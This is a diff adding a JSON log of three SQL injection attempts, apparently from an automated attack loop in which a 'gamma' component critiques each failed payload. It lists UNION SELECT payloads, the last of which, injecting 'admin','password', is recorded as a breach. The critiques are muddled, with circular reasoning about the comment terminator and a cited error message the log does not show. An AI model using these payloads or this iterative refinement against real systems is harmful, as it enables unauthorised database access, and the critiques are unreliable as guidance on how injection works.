@@ -1,0 +1,26 @@
+[
+    {
+        "attempt_number": 1,
+        "vuln_type": "sqli",
+        "payload": " UNION SELECT 1,2,3,4,5,6,7,8,9,10 --",
+        "server_response_summary": "Status 200",
+        "gamma_critique": "The payload failed to breach the SQLi vulnerability because the '--' comment terminator is likely being interpreted as a comment in the SQL syntax, causing the UNION SELECT statement to be ignored. This is a common issue in SQLi attacks where the comment terminator is used, but the actual comment is not being parsed as intended.",
+        "outcome": "failed"
+    },
+    {
+        "attempt_number": 2,
+        "vuln_type": "sqli",
+        "payload": " UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM sqlite_master WHERE type='table' AND name='sqlite_master' --",
+        "server_response_summary": "Status 200",
+        "gamma_critique": "The payload failed to breach the SQLi vulnerability because it is attempting to inject a UNION SELECT statement into a field that likely expects a username, which is not a valid table or column name in the SQLite database. The presence of the 'sqlite_master' table name and the error message \"near 'table': syntax error\" further suggests that the payload is being executed in a context where it is not expected to be a valid SQL query.",
+        "outcome": "failed"
+    },
+    {
+        "attempt_number": 3,
+        "vuln_type": "sqli",
+        "payload": " UNION SELECT 'admin','password' --",
+        "server_response_summary": "200",
+        "gamma_critique": "N/A",
+        "outcome": "breached"
+    }
+]
